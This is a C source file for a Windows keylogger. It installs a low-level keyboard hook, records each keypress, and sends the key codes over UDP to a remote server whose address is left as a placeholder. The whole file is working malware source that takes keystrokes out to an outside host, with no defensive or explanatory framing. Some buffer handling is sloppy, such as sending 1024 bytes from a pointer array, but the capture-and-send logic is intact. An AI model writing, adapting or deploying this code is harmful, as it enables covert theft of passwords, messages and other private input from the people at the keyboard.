#include"Keylogging.h"
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    //get socket
	int sockfd = setsockettoserver();
	wchar_t title[256];
	struct sockaddr_in servaddr;
	char* sendbuf[MaxBufferSize];
	
	//set up the server address, IPV4
	servaddr.sin_family = AF_INET;
	//specify the port that you will send the packet to
	servaddr.sin_port = htons(PORT);
	//input ip of the server
	servaddr.sin_addr.s_addr = inet_addr("/SERVER IP ADDRESS GOES HERE/");
	

	//obtain key data from the Lparam
	PKBDLLHOOKSTRUCT key = (PKBDLLHOOKSTRUCT)lParam;
	if (wParam == WM_KEYDOWN && nCode == HC_ACTION)
	{
        //if key that was pressed output a newline
		if (key->vkCode == VK_RETURN)
        {
            printf("\n");
			*sendbuf = '\n';
			//send the newline to the server
			int n = sendto(sockfd, sendbuf, 1024, 0, (SOCKADDR*)&servaddr, sizeof(servaddr));
			if (n == SOCKET_ERROR)
			{
				//print error if the send fails
				printf("SEND FAILED\n");
				printf("%d\n", WSAGetLastError());
				clean(sockfd);
				return 1;
			}
			printf("sent ok\n");
        }
        //send the key data to server
		else
        {
			printf("%c\n", key->vkCode);
			*sendbuf = key->vkCode;
			//send key data to server
			int n = sendto(sockfd, sendbuf, 1024, 0, (SOCKADDR*)&servaddr, sizeof(servaddr));
			if (n == SOCKET_ERROR)
			{
				printf("SEND FAILED\n");
				printf("%d\n", WSAGetLastError());
				clean(sockfd);
				return 1;
			}
			printf("sent ok\n");
        }
	}

	//close the socket and turn off WSA so we dont attempt to reopen it
	clean(sockfd);
	//call the next hook by passing the parameters back to the keyboard hook
	return CallNextHookEx(keyboardhook, nCode, wParam, lParam);
}
int setsockettoserver()
{
	char negativeidenfier[] = { "[-]" };
	char positiveidentfier[] = { "[+]" };
	int sockfd, connfd, len = { 0 };
	int BufLength = 1024;
	char* SendBuf[MaxBufferSize];
	struct sockaddr_in servaddr, cli;
	WORD wVersionRequested;
	WSADATA wsaData;
	int err;
	int TotalByteSent;
	wVersionRequested = MAKEWORD(2, 2);
	struct in_addr inaddrbuff;
	
	//begin setting up WSA
	err = WSAStartup(wVersionRequested, &wsaData);
	if (err != 0)
	{
		printf("%s WSAStartup failed with error %d\n", negativeidenfier, err);
		exit(1);
	}
	if (LOBYTE(wsaData.wVersion) != 2 || HIBYTE(wsaData.wVersion) != 2) {
		/* Tell the user that we could not find a usable */
		/* WinSock DLL.                                  */
		printf("Could not find a usable version of Winsock.dll\n");
		WSACleanup();
		return 1;
	}
	printf("%s The Winsock 2.2 dll was found okay\n", positiveidentfier);


	//create socket
	sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if (sockfd == -1)
	{
		printf("%s socket creation failed\n", negativeidenfier);
		printf("%d\n", WSAGetLastError());
		exit(0);
	}
	else
	{
		printf("%s socket created successfully\n", positiveidentfier);
	}
	//return socket
	return sockfd;
}


void clean(int sockfd)
{
	closesocket(sockfd);
	WSACleanup();
}